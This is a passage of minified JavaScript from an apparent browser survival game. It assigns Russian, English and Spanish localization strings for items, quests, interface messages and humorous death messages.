                    We[Be.WATERING_CAN] = ["Пустая Лейка", "Вы можете заполнить лейку возле воды"],
                    We[Be.WATERING_CAN_FULL] = ["Лейка", "Позволяет поливать растения", "Урон: 1"],
                    We[Be.BAG] = ["Рюкзак", "Больше места для ваших предметов!"],
                    We[Be.PAPER] = ["Бумага", "Используется при создании книги"],
                    We[Be.BOOK] = ["Книга", "Сокращает время изготовления предметов", "Должно быть одето для работы", "Урон: 1"],
                    We[Be.BANDAGE] = ["Бинт", "Восстанавливает ваше здоровье быстрее", "Лечит: 30", "Эффект: 5"],
                    We[Be.LOCK] = ["Замок", "Позволяет вам закрыть ваш сундук"],
                    We[Be.LOCKPICK] = ["Ключ", "Даёт вам открыть один запертый сундук"],
                    We[Be.TOTEM] = ["Тотем", "Позволяет вам создать команду", "Совместное использование дверей и сундуков", "Вредное здание не повредит вашего друга"],
                    We[Be.BRIDGE] = ["Мост", "Очень полезно на воде", "Позволяет вам пить без потери воздуха", "Передвигаетесь быстрее по воде"],
                    We[Be.SIGN] = ["Табличка", "Оставьте сообщение другим", "Прочность: 200"],
                    We[Be.ROOF] = ["Крыша", "Немного скрывает вас и согревает!"],
                    We[Be.WELL] = ["Колодец", "Позволяет заполнить бутылку", "Прочность: 1000"],
                    We[Be.WALL] = ["Деревянная Стена", "Это просто стена", "Прочность: 1000"],
                    We[Be.STONE_WALL] = ["Каменная Стена", "Это немного посерьезнее.", "Прочность: 1500"],
                    We[Be.GOLD_WALL] = ["Золотая Стена", "Золото на ваших стенах? Она ослепляет.", "Прочность: 2000"],
                    We[Be.DIAMOND_WALL] = ["Алмазная Стена", "Очень блестит, следите за вашими глазами", "Прочность: 2500"],
                    We[Be.AMETHYST_WALL] = ["Аметистовая стена", "Вы должны быть слишком напуганы, чтобы уйти!", "Прочность: 3500"],
                    We[Be.SPIKE] = ["Деревянная Стена с Шипами", "Может наносить урон врагам", "Урон: 10, Урон за один удар: 2", "Прочность: 150"],
                    We[Be.STONE_SPIKE] = ["Каменная Стена с Шипами", "Я не хотел бы быть вашим врагом", "Урон: 20", "Урон за один удар: 3", "Прочность: 300"],
                    We[Be.GOLD_SPIKE] = ["Золотая Стена с Шипами", "Вы очень жестоки.", "Урон: 30", "Урон за один удар: 3", "Прочность: 600"],
                    We[Be.DIAMOND_SPIKE] = ["Алмазная Стена с Шипами", "Вам не нравится иметь компанию.", "Урон: 40", "Урон за один удар: 4", "Прочность: 1200"],
                    We[Be.AMETHYST_SPIKE] = ["Аметистовая Стена с Шипами", "Какого черта, что ваши соседи сделали с вами?", "Урон: 50", "Урон за один удар: 4", "Прочность: 2400"],
                    We[Be.WOOD_DOOR] = ["Деревянная Дверь", "Может быть открыта и закрыта вами или друзьями", "Прочность: 1000"],
                    We[Be.STONE_DOOR] = ["Каменная Дверь", "Более серьезная и сильная дверь", "Прочность: 1500"],
                    We[Be.GOLD_DOOR] = ["Золотая Дверь", 'Вы перестраиваете "Эль Дорадо?"', "Прочность: 2000"],
                    We[Be.DIAMOND_DOOR] = ["Алмазная Дверь", "Для роскошного дома", "Прочность: 2500"],
                    We[Be.AMETHYST_DOOR] = ["Аметистовая Дверь", "Ваш дом в безопасности?", "Прочность: 3000"],
                    We[Be.FURNACE] = ["Печь", "Согревает", "Тратит дерево каждые 5 секунд", "Прочность: 1000"],
                    We[Be.WINDMILL] = ["Мельница", "Может сделать муку из пшеницы", "Требует 5 секунд для получения муки", "Даёт очки при работе", "Прочность: 2000"],
                    We[Be.BREAD_OVEN] = ["Хлебная Печь", "Позволяет готовить хлеб из муки", "Требует 10 секунд для получения хлеба", "Даёт очки при работе", "Прочность: 2000"],
                    We[Be.RESURRECTION] = ["Камень Воскрешения", "Это магия", "Воскрешает вас, если вы призрак", "Вы потеряете своё оружие", "Прочность: 200"],
                    We[TEXT.YOU_CANNOT_JOIN] = "Вы не можете зайти на этот сервер",
                    We[TEXT.KICKED] = "Выгнаны: ",
                    We[TEXT.KEY_ALREADY] = "Ваш ключ уже используется кем-то",
                    We[TEXT.KEY_WRONG] = "Ваш ключ неправильный",
                    We[TEXT.OLD_VERSION] = "У вас старая версия, вам нужно очистить кеш",
                    We[TEXT.NO_MORE_RESOURCES] = "Ресурсов больше нет",
                    We[TEXT.SURVIVED_1DAY] = "Вы выжили 1 день",
                    We[TEXT.SURVIVED] = "Вы выжили ",
                    We[TEXT.DAYS] = " дней",
                    We[TEXT.DEAD_SAD] = "Вы умерли ;-;",
                    We[TEXT.SPAM_ME] = "Сервер не может найти точку спавна! Спамьте кнопку играть!",
                    We[TEXT.SPAM_ME2] = "Сервер заполнен! Спамьте кнопку играть!",
                    We[TEXT.EMPTY] = "Ресурсы закончились",
                    We[TEXT.INV_FULL] = "Инвентарь заполнен (правая кнопка мыши для удаления предметов)",
                    We[TEXT.DEAD] = " умер",
                    We[TEXT.WRONG_TOOL] = "Это не тот инструмент",
                    We[TEXT.JOIN_TEAM] = "Вы вошли в команду",
                    We[TEXT.YOU_DEAD] = "Вы умерли",
                    We[TEXT.JOINED_TEAM] = " вошёл в команду",
                    We[TEXT.TEAM_DESTROYED] = "Ваша команда была разрушена",
                    We[TEXT.LEFT_TEAM] = "Вы покинули команду",
                    We[TEXT.LEFT_TEAM2] = " покинул команду",
                    We[TEXT.TOKEN] = "Кто-то использует ваш токен :>",
                    We[TEXT.CHOOSE] = "Выберите сервер",
                    We[TEXT.PLAYERS] = "игроков",
                    We[TEXT.TOTAL_PLAYERS] = "игроков всего",
                    We[TEXT.TOTAL_MODE] = "игроков в этом режиме",
                    We[TEXT.COMMING_SOON] = "Скоро...",
                    document.getElementById("nickname_input").placeholder = "Имя",
                    n[0] = ["Вы были убиты без причины"],
                    n[1] = ["Вы умерли от голода, как название игры подразумевает это"],
                    n[2] = ["Вы замерзли до смерти. Так грустно", "У вас гипотермия. В следующий раз, постарайтесь быть рядом с огнём."],
                    n[3] = ["Игрок убил тебя и сказал 'стань лучше.'", "Ты был убит игроком. Не волнуйся, этот игрок тоже умрёт, в конце концов."],
                    n[4] = ["Вы стояли слишком близко к огню и сгорели. Плохая идея.", "Ты умер от огня, он причинил вам боль. Напишите историю насчёт этого."],
                    n[5] = ["Ваше тело станет гнездом для яиц паука", "Паук убил вас. По крайней мере это был не кролик."],
                    n[6] = ["Волк больше не будет голодать после того, как наелся вами", "Они не собаки. Волки не любят ласкаться."],
                    n[7] = ["Лиса была слишком быстрой для вас", "Лиса превратила тебя в ящик. С каких пор животные обладают магическими способностями?"],
                    n[8] = ["Медведь просто хотел обнять тебя.", "Медведь был слишком грустным. Мне не жаль."],
                    n[9] = ["Вы были сожжены драконом. Так грустно.", "Вы были сплющены драконом. Быть раздавленным - это ужасный способ умереть."],
                    n[10] = ["Вы прыгнули в стену с шипами. Плохая идея...", "Вы были убиты стеной с шипами. Большинство людей достаточно разумны, чтобы не касаться острых вещей."],
                    n[11] = ["Даже призрак может умереть.", "Вы не смогли воскреснуть. Это игра, и вы можете возвращаться к жизни после смерти, так что..."],
                    n[12] = ["Бактерия из вашей сырой пищи убила вас. Эта игра безусловно сложна.", "Вы убили сырую пищу. Она тоже тебя убила."],
                    n[13] = ["Вы умерли от жажды. Лучше пить собственную мочу."],
                    n[14] = ["Знаешь ли ты, что у голодающих рот всегда под водой, когда они плавают? Теперь ты знаешь."],
                    n[15] = ["Не волнуйся, пиранья сочла тебя вкусным.", "Веселый факт: Пираньи едят людей. В том числе тебя."],
                    n[16] = ["LapaMauve не планировал, что ты убьёшь кракена", "Крак! Кракен сломал твой череп."],
                    n[17] = ["Твоя кожа разваливается, солнце убило тебя"],
                    n[18] = ["Чеснок, хранящийся в твоих карманах сварил твой мозг."],
                    n[19] = ["Не стоит стоять рядом с чесночным зубком, когда вы вампир."],
                    n[20] = ["Вы вампир, Вы ели чеснок, чего вы ожидали?"],
                    n[21] = ["Ваше тело застревает в шипах, когда вы пытаетесь убежать, ваша кожа отрывается, и ваше сердце перестает биться."],
                    ZOMBIE_GRUMBLE = "Uuunnnggg",
                    ZOMBIE_GRUMBLES = ["Uuunnnggg... Я голоден", "Нужны твои мозги Uuunnnggg...", "Свежее мясо здесь... Uuunnnggg", "Uuunnnggg... Ты вкусный", "Uuunnnggg...", "Еда… Uuunnnggg...", "Я чувствую запах крови... Uuunnnggg"]
            }
            function Oe() {
                We[Be.DRAGON_CUBE] = ["You feel a great power emanating from this orb"],
                    n[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."],
                    We[Be.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"],
                    We[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME",
                    We[TEXT.TWITTER] = " Share on Twitter",
                    We[TEXT.FACEBOOK] = " Share on Facebook",
                    We[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points",
                    We[TEXT.POINTS] = "points",
                    We[TEXT.SCORE] = "Score",
                    We[TEXT.KILL] = "Kill",
                    We[TEXT.DAYS_SURVIVED] = "Days survived",
                    We[TEXT.MODE_FREE] = "Building method: Free. Press G to change",
                    We[TEXT.MODE_GRID] = "Building method: Grid. Press G to change",
                    We[Be.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"],
                    We[Be.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Damage: 14", "Building Damage: 4"],
                    We[Be.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 4", "Animals Defense: 13"],
                    We[Be.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"],
                    document.getElementById("typequest").innerHTML = "Chrono Quests",
                    document.getElementById("timeremainingquest").innerHTML = "Time Remaining",
                    document.getElementById("constraintquest").innerHTML = " Constraints",
                    document.getElementById("claim_rewards").innerHTML = " Claim rewards",
                    document.getElementById("rewardquest").innerHTML = " Reward",
                    document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart",
                    document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst",
                    document.getElementById("survive20min_3").innerHTML = "Survive without losing life",
                    document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests",
                    document.getElementById("dont_hit_5").innerHTML = " Be peaceful",
                    document.getElementById("bread_6").innerHTML = " Collect 100 bread in deep winter",
                    document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
                for (var e = 0; e < 7; e++)
                    document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
                document.getElementById("quit_chronoquest").innerHTML = " QUIT",
                    We[Be.HAND] = ["Mano"],
                    We[Be.GROUND] = ["Tierra", "¡Tan limpia como mis manos!"],
                    We[Be.SAND] = ["Arena", "¡Tengo arena en mis ojos!"],
                    We[Be.WOOD] = ["Madera", "¡Nunca hay suficiente!"],
                    We[Be.STONE] = ["Piedra", "También llamada roca."],
                    We[Be.GOLD] = ["Oro", "Sé generoso, compártelo con los otros"],
                    We[Be.DIAMOND] = ["Diamante", "¿Que vas a hacer con él?"],
                    We[Be.AMETHYST] = ["Amatista", "Es Mauve como Lapa"],
                    We[Be.FLOUR] = ["Harina", "Usada para cocinar."],
                    We[Be.COOKIE] = ["Galleta", "Una galleta de la abuelita", "Comida: 50"],
                    We[Be.CAKE] = ["Tarta", "¡Cumpleaños Feliz!", "Comida: 100"],
                    We[Be.MEAT] = ["Carne Cruda", "Se cocina con fuego", "Causa veneno. 10", "Comida: 15"],
                    We[Be.COOKED_MEAT] = ["Carne Cocinada", "es la supervivencia del más fuerte :'(", "Comida: 35"],
                    We[Be.FOODFISH] = ["Pescado Crudo", "Creo que sigue vivo", "Causa veneno de comida: 10", "Comida: 18"],
                    We[Be.FOODFISH_COOKED] = ["Pescado Cocinado", "Con limón sería perfecto", "Comida: 35"],
                    We[Be.BREAD] = ["Pan", "¡Caliente, desde Francia!", "Es dinero usado en la tienda", "Comida: 15"],
                    We[Be.SANDWICH] = ["Bocadillo", "Sabe como un Krabby Patty", "Comida: 100"],
                    We[Be.CANDY] = ["Caramelos", "¡Solo para niños/as!", "Comida: 100"],
                    We[Be.SUGAR_CAN] = ["Caña de Azúcar", "Pruébala, es deliciosa", "Comida: 100"],
                    We[Be.GARLAND] = ["Guirnalda", "Perfecta para decorar el techo"],
                    We[Be.SEED] = ["Semillas de Bayas", "Se convierte en bayas", "Nacimiento: 2 Minutos", "Crecimiento: 55 Segundos", "Necesita agua: 3 Minutos 20 Segundos", "Durabilidad: 700", "Tiempo de vida: 8 Días"],
                    We[Be.PLANT] = ["Baya", "No es venenosa.", "Comida: 10"],
                    We[Be.WHEAT_SEED] = ["Semilla de Trigo", "Se convierte en Trigo ", "Nacimiento: 2 Minutos", "Crecimiento: 16 Segundos", "Necesita agua: 2 Minutos", "Durabilidad: 700", "Tiempo de vida: 8 Días"],
                    We[Be.WILD_WHEAT] = ["Trigo Silvestre", "Se convierte en harina cuando se coloca en un molino"],
                    We[Be.PUMPKIN_SEED] = ["Semilla de Calabaza", "Crece a Calabazas", "Nacimiento: 2 Minutos 40 Segundos", "Crecimiento: 2 Minutos", "Necesita agua: 2 Minutos", "Durabilidad: 700", "Tiempo de vida: 8 Días"],
                    We[Be.PUMPKIN] = ["Calabaza", "Me recuerda a Halloween", "Comida: 30"],
                    We[Be.GARLIC_SEED] = ["Semilla de Ajo", "Muy peligroso para vampiros", "Daño: 20", "Nacimiento: 4 Minutos", "Crecimiento: 1 Minutos 10 Segundos", "Necesita Agua: 1 Minutos 40 Segundos", "Durabilidad: 700", "Tiempo de Vida: 8 Días"],
                    We[Be.GARLIC] = ["Ajo", "Te sana y reduce el frio", "Comida: 14", "sanación con eliempo: 30", "Efecto: 1"],
                    We[Be.THORNBUSH_SEED] = ["Semilla de Planta de Espinas", "Puede dañar a tus enemigos", "Daño por contacto: 20", "Nacimiento: 4 Minutos", "Crecimiento: 15 Segundos", "Necesita Agua: 3 Minutos", "Durabilidad: 1000", "Tiempo de Vida: 8 Días"],
                    We[Be.THORNBUSH] = ["Planta de Espinas", "¡Te daña!"],
                    We[Be.PLOT] = ["Parcela", "En serio, úsala", "Se usa para plantar plantas en invierno o sobre puentes", "Tus plantas crecerán muy rápido y necesitarán menos agua", "Durabilidad: 2000"],
                    We[Be.ICE] = ["Hielo", "Bueno para hacer tartas y agua"],
                    We[Be.SPANNER] = ["Llave de Reparación", "Puede reparar paredes, puertas y pinchos", "Daño: 2"],
                    We[Be.FUR_WOLF] = ["Pelaje de Lobo", "¿Perrito? ¡¿Donde esta el perrito?!"],
                    We[Be.FUR] = ["Pelaje de Conejo", "El Conejo era muy lindo..."],
                    We[Be.SPECIAL_FUR] = ["Pelaje Puro", "¡Eres una maquina de pan!"],
                    We[Be.SPECIAL_FUR_2] = ["Pelaje Oscuro", "¿Estás listo para hacer algo malo?"],
                    We[Be.FUR_WINTER] = ["Pelaje de Invierno", "Esos animales solo querían un abrazo..."],
                    We[Be.SCALES] = ["Escamas", "¡Huele a pescado!"],
                    We[Be.KRAKEN_SKIN] = ["Piel del Kraken", "¡¿No tienes mucho miedo?!"],
                    We[Be.FIRE] = ["Fogata", "¡Te calienta!", "Durabilidad: 150", "Tiempo de vida: 2 Minutos"],
                    We[Be.BIG_FIRE] = ["Fogata Grande", "¡Te calienta por más tiempo!", "Durabilidad: 400", "Tiempo de Vida: 6 Minutos"],
                    We[Be.WORKBENCH] = ["Mesa de Trabajo", "¡Te sirve mucho para crear cosas de todos tipos!"],
                    We[Be.CORD] = ["Hilo", "Usado para craftear ropa y mochila"],
                    We[Be.BLUE_CORD] = ["Hilo de Diamante", "Usado para craftear ropa especial"],
                    We[Be.CHEST] = ["Cofre", "Te permite guardar cosas, o compartirlas", "Durabilidad: 500"],
                    We[Be.SWORD_WOOD] = ["Espada de Madera", "¿Eso funciona?", "Daño: 12", "Daño para estructuras: 4"],
                    We[Be.SWORD] = ["Espada de Piedra", "Sé bueno con los otros", "Daño: 19", "Daño para estructuras: 6"],
                    We[Be.SWORD_GOLD] = ["Espada de Oro", "¡Rey de la selva!", "Daño: 22", "Daño para estructuras: 7"],
                    We[Be.SWORD_DIAMOND] = ["Espada de Diamante", "Puedes sentir el poder", "Daño: 24", "Daño para estructuras: 8"],
                    We[Be.PIRATE_SWORD] = ["Espada de Pirata", "Arrrrr!", "¡Mejor distancia que una espada normal", "Daño: 24", "Daño para estructuras: 8"],
                    We[Be.SWORD_AMETHYST] = ["Espada de Amatista", "Mauve es el mejor color del mundo :3", "Daño: 27", "Daño para estructuras: 9"],
                    We[Be.DRAGON_SWORD] = ["Espada del Dragón", "¡Tienes el poder de un Dragón!", "Daño: 30", "Daño para estructuras: 10"],
                    We[Be.DRAGON_SPEAR] = ["Lanza del Dragón", "¡Mátalos a todos!", "Daño: 22", "Daño para estructuras: 6"],
                    We[Be.PICK_WOOD] = ["Pico de Madera", "Solo puede minar madera y piedra", "Daño: 1"],
                    We[Be.PICK] = ["Pico de Piedra", "Puede minar hasta oro", "Daño: 2"],
                    We[Be.PICK_GOLD] = ["Pico de Oro", "Puede minar hasta Diamante", "Daño: 3", "Daño para estructuras: 1"],
                    We[Be.PICK_DIAMOND] = ["Pico de Diamante", "¡Puede minarlo todo!", "Daño: 4", "Daño para estructuras: 1"],
                    We[Be.PICK_AMETHYST] = ["Pico de Amatista", "¡Puede minarlo todo, parece fantastico!", "Daño: 5", "Daño para estructuras: 1"],
                    We[Be.HAMMER] = ["Martillo de Piedra", "Bueno para destruir estructuras", "No funciona bien con diamante y amatista", "Daño: 2", "Daño para estructuras: 20"],
                    We[Be.HAMMER_GOLD] = ["Martillo de Oro", "Bueno para destruir estructuras", "No funciona bien con amatista ", "Daño: 3", "Daño para estructuras: 30"],
                    We[Be.HAMMER_DIAMOND] = ["Martillo de Diamante", "Bueno para destruir estructuras", "Daño: 4", "Daño para estructuras: 40"],
                    We[Be.HAMMER_AMETHYST] = ["Martillo de Amatista", "Bueno para destruir estructuras", "Daño: 5", "Daño para estructuras: 50"],
                    We[Be.SUPER_HAMMER] = ["Super Martillo", "¿Has planeado destruir el mundo?", "Daño: 12", "Daño para estructuras: 70"],
                    We[Be.WOOD_SPEAR] = ["Lanza de Madera", "Como un palo de madera, pero mata.", "Daño: 10", "Daño para estructuras: 2"],
                    We[Be.SPEAR] = ["Lanza de Piedra", "¡El comienzo de la evolución!", "Daño: 14", "Daño para estructuras: 4"],
                    We[Be.GOLD_SPEAR] = ["Lanza de Oro", "¡Cuidado, te hace mucho daño!", "Daño: 15", "Daño para estructuras: 5"],
                    We[Be.DIAMOND_SPEAR] = ["Lanza de Diamante", "¡Estas preparado para matar al Dragon!", "Daño: 17", "Daño para estructuras: 5"],
                    We[Be.AMETHYST_SPEAR] = ["Lanza de Amatista", "Los dragones te tienen miedo", "Daño: 18", "Daño para estructuras: 6"],
                    We[Be.SHOVEL] = ["Pala de Piedra", "Cava para conseguir tierra, arena y hielo", "También puedes conseguir minerales", "Daño: 2"],
                    We[Be.SHOVEL_GOLD] = ["Pala de Oro", "Cava para conseguir tierra, arena y hielo", "También puedes conseguir minerales", "Daño: 3", "Daño para estructuras: 1"],
                    We[Be.SHOVEL_DIAMOND] = ["Pala de Diamante", "Cava para conseguir tierra, arena y hielo", "También puedes conseguir minerales", "Daño: 4", "Daño para estructuras: 1"],
                    We[Be.SHOVEL_AMETHYST] = ["Pala de Amatista", "Cava para conseguir tierra, arena y hielo", "También puedes conseguir minerales", "Daño: 5", "Daño para estructuras: 1"],
                    We[Be.WOOD_HELMET] = ["Casco de Madera", "¡Mejor que nada!", "Protección contra jugadores: 1", "Protección contra animales: 4"],
                    We[Be.STONE_HELMET] = ["Casco de Piedra", "¡Estas listo para la batalla!", "Protección contra jugadores: 2", "Protección contra animales: 8"],
                    We[Be.GOLD_HELMET] = ["Casco de Oro", "AKA el casco de los salvajes", "Protección contra jugadores: 4", "Protección contra animales: 13"],
                    We[Be.DIAMOND_HELMET] = ["Casco de Diamante", "No ataques tanto", "Protección de jugadores: 5", "Protección contra animales: 19"],
                    We[Be.AMETHYST_HELMET] = ["Casco de Amatista", "¡No tienes miedo de nada!", "Protección contra jugadores: 6", "Protección contra animales: 23"],
                    We[Be.DRAGON_HELMET] = ["Casco del Dragón", "¡Vas a dominar el mundo!", "Protección contra jugadores: 8", "Protección contra animales: 27"],
                    We[Be.EXPLORER_HAT] = ["Gorro del Explorador", "Los animales no te atacarán", "¡Pero no ataques!", " Te calienta en el invierno y fuera del agua"],
                    We[Be.CHRISTMAS_HAT] = ["Gorro de Navidad", "¡Ho, ho, ho, feliz Navidad!", "Te calienta en el invierno y fuera del  agua"],
                    We[Be.ELF_HAT] = ["Gorro del Duende", "¡No dejes que te descubren que eres, duende del hielo!", "Te calienta en el invierno y fuera del agua"],
                    We[Be.HOOD] = ["Capucha", "¡Eres un ladron!", "Puedes robar de alguien solo si", "1) Es de noche", "2) No tienes nada en tu mano", "3) Si no te han tocado en los  8 segundos anteriores", "4) No estas cerca de una fogata", "5) Si tu objetivo no lleva puesto una gorra de campesino", "Te calienta en invierno y fuera del agua"],
                    We[Be.EARMUFFS] = ["Orejeras", "Como un abrigo pequeño.", "Te calienta en invierno y fuera del agua"],
                    We[Be.COAT] = ["Chapka", "También llamado abrigo.", "Te calienta en el invierno y fuera del agua"],
                    We[Be.CAP_SCARF] = ["Gorro y Bufanda ", "Muy cómodo, muy caliente"],
                    We[Be.PEASANT] = ["Gorra de Campesino", "Tus plantas crecen mas rápido", "Te Calienta en el invierno y fuera del agua"],
                    We[Be.WINTER_HOOD] = ["Capucha de Invierno", "Puedes robar de alguien solo si", "1) Es de noche", "2) No tienes nada en tu mano", "3) Si no te han tocado antes de 8 segundos", "4) No estas cerca de un fuego", "5) Si tu objetivo no lleva puesto una Gorra de Campesino", "Te calienta en invierno y fuera del agua"],
                    We[Be.WINTER_PEASANT] = ["Gorra de Invierno del Campesino", "Tus plantas crecen aún más rápido", "Te calienta en invierno y fuera del agua"],
                    We[Be.DIVING_MASK] = ["Máscara de Buceo", "Eres un tiburón en el agua", "Calienta en el agua", "Protección contra jugadores: 2, Protección contra animales: 8"],
                    We[Be.SUPER_DIVING_SUIT] = ["Súper Máscara de Buceo", "Eres muy rápido en agua", "Calienta en el agua", "Defensa del Jugador: 4, Defensa de los animales: 16"],
                    We[Be.DRAGON_ORB] = ["Esfera del Dragón", "Dada en la misión"],
                    We[Be.DRAGON_HEART] = ["Corazón del Dragón", "¡Te convierte en un fantasma cuando mueres!", "Eres un fantasma por 60 segundos", "Encuentra una Piedra de resurreción"],
                    We[Be.GEMME_GREEN] = ["Gema Verde", "¿¿No has hecho trampas, verdad??"],
                    We[Be.GEMME_ORANGE] = ["Gema Naranja", "¡Solo un pirata verdadero lo puede encontrar!"],
                    We[Be.GEMME_BLUE] = ["Gema Azul", "Para gente muy amable"],
                    We[Be.CROWN_GREEN] = ["Corona Verde", "Te sanas muy rápido", "Sanación con el tiempo: 40", "Protección contra jugadores: 4, Protección contra animales: 16"],
                    We[Be.CROWN_ORANGE] = ["Corona Naranja", "Ahora tienes much suerte", "Protección contra jugadores: 4, Protección contra animales: 16"],
                    We[Be.CROWN_BLUE] = ["Corona Azul", "Cuando mueres, te conviertes en un fantasma", "Pero perderás tu alma", "Protección contra jugador: 4, Protección contra animales: 16"],
                    We[Be.BUCKET_FULL] = ["Cubo", "Bueno para rellenar botellas", "Un cubo es equivalente a 12 botellas"],
                    We[Be.BUCKET_EMPTY] = ["Cubo Vacío", "Tienes que llenar este cubo con agua"],
                    We[Be.BOTTLE_FULL] = ["Botella", "Te permite beber agua donde quieras", "Agua: 50"],
                    We[Be.BOTTLE_EMPTY] = ["Botella Vacia", "La puedes llenar de agua"],
                    We[Be.WATERING_CAN] = ["Regadera Vacía", "La tienes que llenar de agua"],
                    We[Be.WATERING_CAN_FULL] = ["Regadera", "Te permite regar las plantas", "Daño: 1"],
                    We[Be.BAG] = ["Mochila", "¡Mas espacio para tus cosas!"],
                    We[Be.PAPER] = ["Hoja", "Usada para hacer un libro"],
                    We[Be.BOOK] = ["Libro", "Reduce el tiempo de elaboración", "Lo tienes que tener en la mano para que funcione", "Daño: 1"],
                    We[Be.BANDAGE] = ["Vendaje", "Recuperas vida mas rapido", "Sanación tiempo: 30", "Efecto: 5"],
                    We[Be.LOCK] = ["Cerradura", "Te permite cerrar tu cofre"],
                    We[Be.LOCKPICK] = ["Llave", "Te permite abrir un cofre cerrado"],
                    We[Be.TOTEM] = ["Tótem", "Te permite crear un equipo", "Compartir puertas y cofres cerrados", "Tus pinchos no dañan al resto tu equipo"],
                    We[Be.BRIDGE] = ["Puente", "Muy útil en el agua", "Te permite beber agua sin tener que ahogarse", "Puedes nadar más rápido encima del agua"],
                    We[Be.SIGN] = ["Cartel", "Sirve para dejar un mensage para otros", "Durabilidad: 200"],
                    We[Be.ROOF] = ["Techo", "Te esconde un poco y te protege del frío"],
                    We[Be.WELL] = ["Fuente", "Permite rellenar botellas", "Durabilidad: 1000"],
                    We[Be.WALL] = ["Pared de Madera", "Es solo una pared.", "Durabilidad: 1000"],
                    We[Be.STONE_WALL] = ["Pared de Piedra", "Es un poco más serio", "Durabilidad: 1500"],
                    We[Be.GOLD_WALL] = ["Pared de Oro", "¿Oro en de tus paredes? Eres rico", "Durabilidad: 2000"],
                    We[Be.DIAMOND_WALL] = ["Pared de Diamante", "Muy brillante, cuidado con tus ojos", "Durabilidad: 2500"],
                    We[Be.AMETHYST_WALL] = ["Pared de Amatista", "¡Debes tener mucho miedo de lo que hay fuera!", "Durabilidad: 3500"],
                    We[Be.SPIKE] = ["Pincho de Madera", "Puede dañar a tus enemigos", "Daño: 10, Daño por golpe: 2", "Durabilidad: 150"],
                    We[Be.STONE_SPIKE] = ["Pincho de Piedra", "No querría ser tu enemigo.", "Daño: 20", "Daño por contacto: 3", "Durabilidad: 300"],
                    We[Be.GOLD_SPIKE] = ["Pincho de Oro", "¡Eres tan cruel!", "Daño: 30", "Daño por golpe: 3", "Durabilidad: 600"],
                    We[Be.DIAMOND_SPIKE] = ["Pincho de Diamante", "No te gusta tener compañía.", "Daño: 40", "Daño por contacto: 4", "Durabilidad: 1200"],
                    We[Be.AMETHYST_SPIKE] = ["Pincho de Amatista", "¡¿Que demonios te hicieron tus vecinos?!", "Daño: 50", "Daño por contacto: 4", "Durabilidad: 2400"],
                    We[Be.WOOD_DOOR] = ["Puerta de Madera", "Puedes abrir y cerrarla ", "Durabilidad: 1000"],
                    We[Be.STONE_DOOR] = ["Puerta de Piedra", "Una puerta más buena es más seria", "Durabilidad: 1500"],
                    We[Be.GOLD_DOOR] = ["Puerta de Oro", "¿Estas reconstruyendo El Dorado?", "Durabilidad: 2000"],
                    We[Be.DIAMOND_DOOR] = ["Puerta de Diamante", "Para una casa brillante", "Durabilidad: 2500"],
                    We[Be.AMETHYST_DOOR] = ["Puerta de Amatista", "¿Tu casa es una caja fuerte?", "Durabilidad: 3500"],
                    We[Be.FURNACE] = ["Caldera", "Te calienta", "Consume 1 Madera cada 5 segundos", "Durabilidad: 1000"],
                    We[Be.WINDMILL] = ["Molino", "Puede producir harina a partir del trigo", "Necesita 5 segundos para producir harina", "Devuelve los puntos que trabaja", "Durabilidad: 2000"],
                    We[Be.BREAD_OVEN] = ["Horno de Pan", "Produce pan de harina", "Necesita 10 segundos para producir Pan", "Devuelve los puntos que trabaja", "Durabilidad: 2000"],
                    We[Be.RESURRECTION] = ["Piedra de Resurreción", "¡Es magia!", "Te resucitacuando eres una fantasma", "Perderás tu arma", "Durabilidad: 200"],
                    We[TEXT.YOU_CANNOT_JOIN] = "No puedes unirte a este servidor",
                    We[TEXT.KICKED] = "Expulsado: ",
                    We[TEXT.KEY_ALREADY] = "Tu llave ya está usada",
                    We[TEXT.KEY_WRONG] = "Tu llave está mal",
                    We[TEXT.OLD_VERSION] = "Tienes una versión antigua, limpia tu cache",
                    We[TEXT.NO_MORE_RESOURCES] = "No hay mas recursos",
                    We[TEXT.SURVIVED_1DAY] = "Has sobrevivido 1 día",
                    We[TEXT.SURVIVED] = "Has sobrevivido ",
                    We[TEXT.DAYS] = " días",
                    We[TEXT.DEAD_SAD] = "Estás muerto ;-;",
                    We[TEXT.SPAM_ME] = "No se encuentra un lugar para unirse, ¡spamea el botón de jugar!",
                    We[TEXT.SPAM_ME2] = "El servidor esta lleno, ¡spamea el botón de jugar!",
                    We[TEXT.EMPTY] = "Recurso vacio",
                    We[TEXT.INV_FULL] = "¡Inventario lleno!(Haz click derecho para borrar cosas) ",
                    We[TEXT.DEAD] = " está muerto",
                    We[TEXT.WRONG_TOOL] = "Esta no es la herramienta correcta",
                    We[TEXT.JOIN_TEAM] = "Te has unido a un equipo",
                    We[TEXT.YOU_DEAD] = "Estás muerto",
                    We[TEXT.JOINED_TEAM] = " se unió al equipo",
                    We[TEXT.TEAM_DESTROYED] = "Tu equipo ha sido destruido",
                    We[TEXT.LEFT_TEAM] = "Has dejado el equipo",
                    We[TEXT.LEFT_TEAM2] = " dejo el equipo ",
                    We[TEXT.TOKEN] = "Alguien te robó tu token :>",
                    We[TEXT.CHOOSE] = "Elige un servidor",
                    We[TEXT.PLAYERS] = "jugadores",
                    We[TEXT.TOTAL_PLAYERS] = "total de jugadores",
                    We[TEXT.TOTAL_MODE] = "Jugadores en este modo de juego",
                    We[TEXT.COMMING_SOON] = "Próximamente...",
                    document.getElementById("nickname_input").placeholder = "Apodo",
                    n[0] = ["Has muerto por ninguna razón"],
                    n[1] = ["Has muerto de hambre, como implica el nombre del juego dice"],
                    n[2] = ["Te has congelado hasta morir, qué triste", "Moriste por hipotermia. La próxima quédate cerca de  una fogata."],
